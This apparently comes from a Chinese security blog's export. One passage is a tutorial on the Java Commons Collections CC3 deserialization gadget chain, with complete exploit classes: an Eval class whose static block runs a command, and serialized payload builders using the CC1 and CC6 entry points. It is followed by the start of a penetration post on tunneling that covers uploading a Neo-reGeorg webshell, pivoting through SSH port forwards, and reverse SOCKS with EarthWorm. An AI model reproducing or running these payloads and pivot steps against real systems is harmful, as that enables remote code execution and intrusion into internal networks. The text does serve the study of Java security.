类加载器根据全限定类名判断类是否加载，如果已经加载则直接返回已加载类。如果没有加载，类加载器会首先委托父类加载器加载此类。父类加载器也会采用相同的策略，查看是否自己已经加载该类，如果有就返回，没有就继续委托给父类进行加载，直到BootStrapClassLoader。如果父类加载器无法加载，就会交给子类进行加载，如果还不能加载就继续交给子类加载。顺序为 BootStrapClassLoader-&gt;ExtClassLoader-&gt;AppClassLoader-&gt;自定义类加载器 。 双亲委派机制的好处： 能够有效确保一个类的全局唯一性，当程序中出现多个限定名相同的类时，类加载器在执行加载时，始终只会加载其中的某一个类。加载的先后顺序其实确定了类被加载的优先级，如果出现了限定名相同的类，类加载器在执行加载时只会加载优先级最高的那个类。 利用链之 TemplatesImpl 类TemplatesImpl 类中的静态内部类 TransletClassLoader 就是一个自定义类加载器，它继承了 ClassLoader ，重写了 defineClass 方法。于是我们可以传入一个自定义的恶意类字节码，当用 defineClass 将其加载时，恶意类中的静态代码块将被执行，所以可以把命令放在静态代码块中。 利用链总结123456/*TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass()*/ TransletClassLoader 静态内部类的 defineClass 方法： 123Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length);&#125; 这里需要传入一个字节数组，字节数组中应当存放我们自定义类的字节码。接下来看看哪里调用了这个方法，defineTransletClasses 方法中调用了这个方法。 defineTransletClasses 是外部类 TemplatesImpl 的成员方法，它调用了 TransletClassLoader 内部类的 defineClass 方法： 由于 defineTransletClasses 是私有方法，再找找谁调用了这个方法。 getTransletInstance 方法调用了 defineTransletClasses 方法： 由于 getTransletInstance 是私有方法，再找找谁调用了这个方法。 newTransformer 方法调用了 getTransletInstance ： 判断绕过刚才在看代码的时候看到一些判断条件，现在来过一下判断。 getTransletInstance 方法中，如果 _name 为空那么将会直接返回 null，所以 _name 应该不为空，以及需要 _class 为空才能调用 defineTransletClasses 方法： defineTransletClasses 方法中如果 _bytecodes 为空会直接抛出异常，所以这里 _bytecodes 应该不为空，以及下面会调用 _tfactory 方法，所以 _tfactory 不为空： 总结一下： _name 不为空 1private String _name = null; _class 为空 1private Class[] _class = null; _bytecodes 需要被赋值为字节码文件 1private byte[][] _bytecodes = null; 它后面会作为 defineClass 方法的参数： 1_class[i] = loader.defineClass(_bytecodes[i]); 由于 _bytecodes 是一个二维数组，而传入的参数是 _bytecodes[i] ，也就是一个一维数组，所以我们需要创建一个一维数组，再把它放到 _bytecodes 二维数组中去。这里因为前面的循环次数取的是 _bytecodes 的长度，如果只传入一个一维数组，那么长度为 1 ，只循环一次，i 只能取到 0 这个值，那么 _bytecodes[i] 就是传入的一维数组： _tfactory 需要被赋值为 TransformerFactoryImpl 对象 1private transient TransformerFactoryImpl _tfactory = null; 由于 _tfactory 被 transient 修饰，无法被序列化，因此没办法手动赋值。但是在 TemplatesImpl 类的 readObject 方法中有赋值语句： 1_tfactory = new TransformerFactoryImpl(); 所以 _tfactory 可以不用管。 除此之外，我们还需要关注一件事： 这里会判断我们传入的类的父类是否为 ABSTRACT_TRANSLET ，如果是的话才会将 _transletIndex 赋值成 i （此时 i 为 0），而 _transletIndex 的默认值是 -1 ，如果这里不被赋值的话，下面经过判断后就会直接抛出异常。所以我们还要让传入的类继承 ABSTRACT_TRANSLET 。 我们可以在 TemplatesImpl 类中查到 ABSTRACT_TRANSLET 属性的定义： 可以看到它指代的类是 AbstractTranslet ，那么我们只需让传入的类继承 AbstractTranslet 类就行。 写个小程序验证一下恶意类 Eval ： 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.io.Serializable;public class Eval extends AbstractTranslet &#123; // 恶意代码放在静态代码块中 static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; // 需要重写父类的两个方法 @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 执行程序 test1 ： 1234567891011121314151617181920212223242526272829303132import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class test1 &#123; public static void main(String[] args) throws Exception &#123; // 初始化TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); // _name不为空 setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC3链\\\\CC3\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); byte[][] codes = &#123;code&#125;; // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值 setFieldValue(templates, &quot;_bytecodes&quot;, codes); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); templates.newTransformer(); &#125; // 反射设置值的操作重复，可以抽离成一个方法 public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123; Class clazz = object.getClass(); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object, filed_value); &#125;&#125; 成功弹出计算器。 利用链之 TrAXFilter 类TrAXFilter 的构造方法会调用 TemplatesImpl 的 newTransformer() 方法： 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException&#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism();&#125; 而且还是个 public 方法，可惜的是 TrAXFilter 不能被序列化。 入口类 InstantiateTransformerInstantiateTransformer 的 transform 能够实例化对象： 1234567891011121314151617181920public Object transform(Object input) &#123; try &#123; if (input instanceof Class == false) &#123; throw new FunctorException( &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;); &#125; catch (InstantiationException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex); &#125;&#125; 于是我们可以直接用 InstantiateTransformer 来实例化 TrAXFilter 对象。 写个小程序验证一下123456789101112131415161718192021222324252627282930313233343536import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class test2 &#123; public static void main(String[] args) throws Exception &#123; // 初始化TemplatesImpl对象 TemplatesImpl templates = new TemplatesImpl(); // _name不为空 setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC3链\\\\CC3\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); byte[][] codes = &#123;code&#125;; // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值 setFieldValue(templates, &quot;_bytecodes&quot;, codes); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); // 初始化InstantiateTransformer对象，利用它实例化TrAXFilter对象 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); instantiateTransformer.transform(TrAXFilter.class); &#125; // 反射设置值的操作重复，可以抽离成一个方法 public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123; Class clazz = object.getClass(); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object, filed_value); &#125;&#125; 反序列化利用我们依然是选择用 InvokerTransformer 类的 transform 方法来执行 TemplatesImpl 的 newTransformer() 方法。但是反序列化的入口有多个选择，可以使用 AnnotationInvocationHandler 的 readObject ，或者 HashMap 的 readObject 。 除了上述方法之外还可以用 TrAXFilter 类来调用 TemplatesImpl 的 newTransformer() 方法。 将 AnnotationInvocationHandler 作为入口类前面学 CC1 链的时候我们就是用 AnnotationInvocationHandler 的 readObject 方法来反序列化的，但是有 Java 版本限制。 payload 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC1_TemplatesImpl &#123; public static void main(String[] args) throws Exception &#123; // 初始化 TemplatesImpl 对象 TemplatesImpl templates = new TemplatesImpl(); // _name 不为空 setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;); // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC3链\\\\CC3\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); byte[][] codes = &#123;code&#125;; // _bytecodes 不为空 setFieldValue(templates,&quot;_bytecodes&quot;,codes); //利用 ChainedTransformer 执行 templates.newTransformer(); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 HashMap ，没什么意义，仅作为参数传入 HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法 Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); // 反射获取 AnnotationInvocationHandler 的构造方法 Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlConstructor.setAccessible(true); // 利用构造方法将 AnnotationInvocationHandler 对象的 memberValues 属性赋值为 LazyMap 对象 // memberValues 属性的 get 方法将会被 AnnotationInvocationHandler 的 invoke 方法调用 InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap); // 为了能够调用 h 的 invoke 方法，我们用 h 来构造一个代理对象，这样当代理对象的任意方法被调用时，h 的 invoke 方法都会被调用 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h); // 再次利用构造方法将另一个 AnnotationInvocationHandler 对象的 memberValues 属性赋值为代理对象 // AnnotationInvocationHandler 的 readObject 方法中会调用 memberValues.entrySet() 方法，届时代理对象的 invoke 方法将被触发 Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy); serialize(o); unserialize(&quot;cc1_templatesImpl.bin&quot;); &#125; public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123; Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); &#125; public static void serialize(Object o) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1_templatesImpl.bin&quot;)); oos.writeObject(o); &#125; public static void unserialize(String filename) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); &#125;&#125; 将 HashMap 作为入口类前面学 CC6 链时，我们便是将 HashMap 作为入口类，原因是 HashMap 的 readObject 方法会调用 key 的 hashCode 方法。 之后的利用链 TiedMapEntry ： 1TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get() 所以将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象就好。 payload 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC6_TemplatesImpl &#123; public static void main(String[] args) throws Exception &#123; // 初始化 TemplatesImpl 对象 TemplatesImpl templates = new TemplatesImpl(); // _name 不为空 setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;); // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC3链\\\\CC3\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); byte[][] codes = &#123;code&#125;; // _bytecodes 不为空 setFieldValue(templates,&quot;_bytecodes&quot;,codes); //利用 ChainedTransformer 执行 templates.newTransformer(); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 HashMap ，没什么意义，仅作为参数传入 HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法 // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象 Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象 // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get() TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;key&quot;); // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode() HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值 // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法 map2.put(tiedMapEntry,&quot;test&quot;); // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key lazyMap.remove(&quot;key&quot;); // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer Class c = LazyMap.class; Field factory = c.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap,chainedTransformer); serialize(map2); unserialize(&quot;cc6_templatesImpl.bin&quot;); &#125; public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123; Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc6_templatesImpl.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String filename) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); &#125;&#125; TrAXFilter + InstantiateTransformer 代替 InvokerTransformer利用 TrAXFilter 的构造方法调用 TemplatesImpl 的 newTransformer() 方法，就不需要使用 InvokerTransformer 了。入口类可以从上面两个中选一个。 为了更加通用，这里选择将 HashMap 作为入口类，payload 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class TrAXFilter_TemplatesImpl &#123; public static void main(String[] args) throws Exception &#123; // 初始化 TemplatesImpl 对象 TemplatesImpl templates = new TemplatesImpl(); // _name 不为空 setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); // 初始化 InstantiateTransformer 对象，利用它实例化 TrAXFilter 对象 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件 byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\miaoj\\\\Documents\\\\Java安全代码实验\\\\CC3链\\\\CC3\\\\target\\\\classes\\\\com\\\\miaoji\\\\Eval.class&quot;)); byte[][] codes = &#123;code&#125;; // _bytecodes 不为空 setFieldValue(templates, &quot;_bytecodes&quot;, codes); // 利用 ChainedTransformer 执行 templates.newTransformer(); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), instantiateTransformer &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // 新建一个 HashMap ，没什么意义，仅作为参数传入 HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法 // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象 Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象 // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get() TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;); // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode() HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;(); // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值 // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法 map2.put(tiedMapEntry, &quot;test&quot;); // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key lazyMap.remove(&quot;key&quot;); // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer Class c = LazyMap.class; Field factory = c.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap, chainedTransformer); serialize(map2); unserialize(&quot;trAXFilter_templatesImpl.bin&quot;); &#125; public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123; Class clazz = object.getClass(); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object, filed_value); &#125; public static void serialize(Object obj) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;trAXFilter_templatesImpl.bin&quot;)); oos.writeObject(obj); &#125; public static Object unserialize(String filename) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); &#125;&#125;","categories":["Java 安全"]},{"title":"内网渗透 03 - 隧道通信","path":"/2024/05/16/内网渗透/内网渗透03-隧道通信/","content":"网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。 内网渗透-隧道通信推荐博客：内网渗透之隧道传输技术 什么是隧道协议？隧道协议（英语：Tunneling Protocol）是一种网络协议，在其中，使用一种网络协议（发送协议），将另一个不同的网络协议，封装在负载部分。使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。 常见的隧道协议包括 SSH，TLS，SOCKS，PPTP 等。 什么是隧道传输？网络隧道技术指的是利用一种网络协议来传输另一种网络协议，它主要利用网络隧道协议来实现这种功能。网络隧道技术涉及了三种网络协议，即网络隧道协议、隧道协议下面的承载协议和隧道协议所承载的被承载协议。 防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。常见的隧道列举如下： 网络层：IPv6 隧道、ICMP 隧道、GRE 隧道 传输层：TCP 隧道、UDP 隧道、常规端口转发 应用层：SSH 隧道、HTTP 隧道、HTTPS 隧道、DNS 隧道 Metasploit 攻击载荷的分类攻击载荷（payload）可分为 single、stager、stage 三种。 1、 singles（独立载荷） 直接植入目标系统并执行相应的程序，如：shell_bind_tcp，meterpreter_reverse_tcp 2、stagers（传输器载荷） 用于目标机与攻击机之间建立稳定的网络连接，与 stages（传输体载荷）配合攻击，该种载荷体积都非常小，如：bind 型和 reverse 型。 bind 型：需要攻击机主动连接目标端口。 reverse 型：目标机反向连接攻击机，需要提前设定好连接攻击机的 ip 地址和端口号。 3、stages（传输体） 在 stagers 建立好稳定的连接后，攻击机将 stages 传输给目标机，由 stagers 进行相应处理，将控制权转交给 stages 。如得到目标机的 shell 或者 meterpreter 控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。 stager 和 stage 就像 web 入侵里面提到的小马和大马一样，由于 exploit 环境的限制，可能不能一下子把 stage 传过去，需要先传一个 stager ，stager 在 attacker 和 target 之间建立网络连接，之后再把 stage 传过去进行下一步的行动。 格式 single payload 的格式为：&#x2F; ，比如：windows/shell_bind_tcp ； stages&#x2F;stagers payload 的格式为：&#x2F;&#x2F; ，比如：windows/meterpreter/bind_tcp 使用 Neo-reGeorg 建立正向隧道关于 Neo-reGeorgNeo-reGeorg 是常见的 http 正向隧道工具，是 reGeorg 工具的升级版。增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持 py3 等等。 有时候我们会发现上传的木马很快就被杀掉了，导致无法获取 shell ，但是目标主机又开启了 web 服务，那么这时就可以建立 http 隧道。 下载地址：https://github.com/L-codes/Neo-reGeorg Neo-reGeorg 使用方法进入到 Neo-reGeorg-master 目录下，执行以下命令，生成 webshell ，连接密码为 ‘ shell ’ ： 1python3 neoreg.py generate -k shell 这会在当前目录下生成一个 neoreg_servers 文件夹，里面包含了各种类型的 webshell ： 在生成的 webshell 中选择目标机对应语言的后门上传即可。 上传成功后，通过以下命令建立起隧道通信： 1python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php 执行结果： 12345678910111213141516171819202122232425262728293031┌──(root㉿kali)-[~/Neo-reGeorg-master]└─# python3 neoreg.py -k shell -u http://192.168.43.13:8080/tunnel.php​ &quot;$$$$$$&#x27;&#x27; &#x27;M$ &#x27;$$$@m​ :$$$$$$$$$$$$$$&#x27;&#x27;$$$$&#x27; &#x27;$&#x27; &#x27;JZI&#x27;$$&amp; $$$$&#x27;​ &#x27;$$$ &#x27;$$$$​ $$$$ J$$$$&#x27;​ m$$$$ $$$$,​ $$$$@ &#x27;$$$$_ Neo-reGeorg​ &#x27;1t$$$$&#x27; &#x27;$$$$&lt;​ &#x27;$$$$$$$$$$&#x27; $$$$ version 5.2.0​ &#x27;@$$$$&#x27; $$$$&#x27;​ &#x27;$$$$ &#x27;$$$@​ &#x27;z$$$$$$ @$$$​ r$$$ $$|​ &#x27;$$v c$$​ &#x27;$$v $$v$$$$$$$$$#​ $$x$$$$$$$$$twelve$$$@$&#x27;​ @$$$@L &#x27; &#x27;&lt;@$$$$$$$$`​ $$ &#x27;$$$ [ Github ] https://github.com/L-codes/Neo-reGeorg+------------------------------------------------------------------------+ Log Level set to [ERROR] Starting SOCKS5 server [127.0.0.1:1080] Tunnel at: http://192.168.43.13:8080/tunnel.php+------------------------------------------------------------------------+ 默认建立的是 socks5:&#x2F;&#x2F;127.0.0.1:1080 ，所以依然可以通过 proxychains 来利用： 1proxychains curl http://192.168.43.13:8080 基于 SSH 的隧道通信什么是 ssh 隧道SSH 隧道即 SSH 端口转发，在 SSH 客户端与 SSH 服务端之间建立一个隧道，将网络数据通过该隧道转发至指定端口，从而进行网络通信。SSH 隧道自动提供了相应的加密及解密服务，保证了数据传输的安全性。 Windows server 2019 开启 ssh 服务首先需要开启靶机的 22 端口，使其能够进行 ssh 远程连接。 下方搜索栏搜索并打开 “ 应用和功能 ” ： 选择 “ 管理可选功能 ” ： 选择 “ 添加功能 ” ： 选择 “ OpenSSH 服务器 ” 并安装。 安装后程序位于：C:\\Windows\\System32\\OpenSSH 。 执行以下命令即可开启 sshd 服务： 1net start sshd ssh 本地端口转发ssh 本地端口转发命令的「-L」旗标后可以填写四个参数，完整格式为： 1ssh -L [收听接口:]收听端口:目标主机:目标端口 username@hostname 命令中方括号内的部分，即第一个参数可以不写；它的默认值一般是 0.0.0.0（OpenSSH 客户端配置文件「ssh_config」中「GatewayPorts」选项的值一般为「yes」），意味着 SSH 隧道会收听所有接口，接受来自任何地址的应用访问请求并进行转发。 执行此命令后，将能够在收听端口处访问目标主机的目标端口。 比如，以 192.168.43.13 为跳板机，将 192.168.52.143 内网主机的 80 端口转发到本机的 8879 端口： 1ssh -CfNg -L 8879:192.168.52.143:80 Administrator@192.168.43.13 -C：这个选项表示启用压缩。SSH 将会压缩数据包数据，这可以提高传输效率，特别是在带宽较低的情况下。压缩可以减少传输的数据量，从而加快数据传输速度，并可能降低网络延迟。 -f：这个选项表示 SSH 客户端在创建隧道后进入后台运行。这意味着一旦隧道建立，SSH 客户端不会占用终端，允许用户继续在同一个终端上执行其他任务。这对于需要长时间运行的隧道特别有用。 -N：这个选项表示如果 SSH 检测到隧道没有数据传输，它不会关闭隧道。通常，SSH 会关闭空闲的隧道以节省资源，但使用 -N 选项后，即使没有数据流动，隧道也会保持开启状态。 -g：这个选项允许 SSH 绑定到非本地地址。默认情况下，SSH 只能绑定到本地地址，但使用 -g 选项后，可以指定一个非本地的端口进行监听。这对于需要从远程网络访问本地服务的情况非常有用。 那么此时访问本机的 8879 端口就可以访问到内网主机 192.168.52.143 的 80 端口了。 上述命令在 kali 上执行，因此称为本地转发。 kali 开启 sshd 服务一、配置 SSH 参数 修改 sshd_config 文件，命令为：vi /etc/ssh/sshd_config 。 将 #PasswordAuthentication no 的注释去掉，并且将 NO 修改为 YES &#x2F;&#x2F; kali 中默认是 yes ； 将 #PermitRootLogin without-password 修改为 PermitRootLogin yes ； 然后保存退出 vi 编辑器。 二、启动 SSH 服务 启动 SSH 服务，命令为： /etc/init.d/ssh start 或者： service ssh start 查看 SSH 服务状态是否正常运行，命令为： /etc/init.d/ssh status 或者： service ssh status 注明：这两种启动 ssh 方式都是临时性的，如果机器重启就需要重新输入上面命令才可以开启 ssh ，如果需要 ssh 服务下次开机自动启动，则需要使用以下命令启动 ssh 服务，命令为： 12update-rc.d ssh enable // 系统自动启动SSH服务update-rc.d ssh disabled // 关闭系统自动启动SSH服务 三、关闭 ssh 服务 1service sshd stop SSH 远程端口转发在 Windows server 2019 上执行以下命令用 ssh 连接 kali ，这里的 192.168.52.143 仍然是内网主机，但最后是 kali 的用户名和 IP ： 1ssh -CfNg -R 3333:192.168.52.143:80 root@192.168.43.173 这样做的前提是 kali 要启动 sshd 服务。完成上述操作后，在 kali 上访问 127.0.0.1:3333 即可访问到 192.168.52.143:80 。 EarthWorm 工具的使用EW（Earthworm）是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向” 、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内，强烈推荐使用。 下载地址：https://github.com/mrawb/ew/tree/master EW 的使用方法 该工具共有 6 种命令格式（ ssocksd 、rcsocks 、rssocks 、lcx_slave 、lcx_listen 、lcx_tran ）： 1234567891011./ew -s ssocksd -l 1080 //开启正向socks服务./ew -s rcsocks -l 1080 -e 8888 //监听1080端口，1080接收的数据通过8888交互传递./ew -s rssocks -d rev_ip -e 8888 //开启反向socks服务。反向连接rev_ip的8888端口./ew -s lcx_listen -l 1080 -e 8888 //监听1080端口，1080接收的数据通过8888交互传递./ew -s lcx_tran -l 1080 -f forward_ip -g8888 